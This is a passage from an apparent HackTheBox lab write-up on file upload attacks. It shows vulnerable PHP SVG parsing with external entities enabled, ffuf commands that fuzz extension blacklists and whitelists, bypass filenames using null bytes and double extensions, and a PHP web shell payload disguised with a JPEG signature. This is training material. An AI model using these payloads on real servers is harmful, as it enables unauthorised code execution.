            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpeg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/png':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/png;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/gif':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/gif;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/svg+xml':
            libxml_disable_entity_loader(false);
            $doc = new DOMDocument();
            $doc->loadXML(file_get_contents($imageFile), LIBXML_NOENT | LIBXML_DTDLOAD);
            $svg = $doc->getElementsByTagName('svg');
            echo $svg->item(0)->C14N();
            break;
        default:
            echo "Image type not recognized";
    }
}
```

### Fuzzing Blacklist

I dont think we need to do blacklist fuzzing since the source code made it clear that the file has to end with the letter `g`but we will fuzz it anyway

```bash
ffuf -w blacklist.txt \
     -u http://94.237.121.111:47980/contact/upload.php \
     -X POST \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNzQtJB8NRcA3oBSs" \
     -d $'------WebKitFormBoundaryNzQtJB8NRcA3oBSs\r\nContent-Disposition: form-data; name="uploadFile"; filename="exploitFUZZ"\r\nContent-Type: image/svg+xml\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><svg>test</svg>\r\n------WebKitFormBoundaryNzQtJB8NRcA3oBSs--' \
     -fc 400,404 \
     -x http://127.0.0.1:8080
```

requests with no error: (the server will save them as \x00.png  )

```bash
filename="exploit.php\x00.jpg"
filename="exploit.php\x00.png"
```

requests that hits the whitelist (error “`Only images are allowed`”)

```bash
filename="exploit.phar"
filename="exploit.inc"
filename="exploit.pgif"
filename="exploit.pht"
filename="exploit.php\x00.gif"
filename="exploit.phtm"
```

Other requests hit the blacklist

### Fuzzing Whitelist (Reverse Double Extension)

Since the script check for the last extension, we will use reverse double extension `filename="exploitFUZZ.svg”`

```bash
ffuf -w whitelist.txt \
     -u http://94.237.121.111:47980/contact/upload.php \
     -X POST \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNzQtJB8NRcA3oBSs" \
     -d $'------WebKitFormBoundaryNzQtJB8NRcA3oBSs\r\nContent-Disposition: form-data; name="uploadFile"; filename="exploitFUZZ.svg"\r\nContent-Type: image/svg+xml\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><svg>test</svg>\r\n------WebKitFormBoundaryNzQtJB8NRcA3oBSs--' \
     -fc 400,404 \
     -x http://127.0.0.1:8080
```

Bypassed file names: 

```bash
 filename="exploit.phar.svg"
 filename="exploit.html.svg"
 filename="exploit.json.svg"
 filename="exploit.htm.svg"
 filename="exploit.pht.svg"
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s5.png)

### LFI Exploitation

For the exploitation to work, we need a valid image signature and a file name as 

```bash
filename="dog.phar.jpeg"
```

the content-type keep it as `image/jpeg` and use this php script

```bash
ÿØÿà<!php SYSTEM($_GET['cmd']);>
```

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s6.png)

From the source code, the files are uploaded into this directory

```php
// uploaded files directory
$target_dir = "./user_feedback_submissions/";
```

and the files renamed as `date_<filename>`

```php
// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
```

I uploaded the file on `2026-01-25`, so the file name will be `260125_dog.phar.jpeg` 

![ALT](/HTB/Web_Penetration_Tester/File_Upload_Attacks/Images/s7.png)

Note that it may not work at the first time and if it didnt work, try changing the file name or recapturing the image uploaded.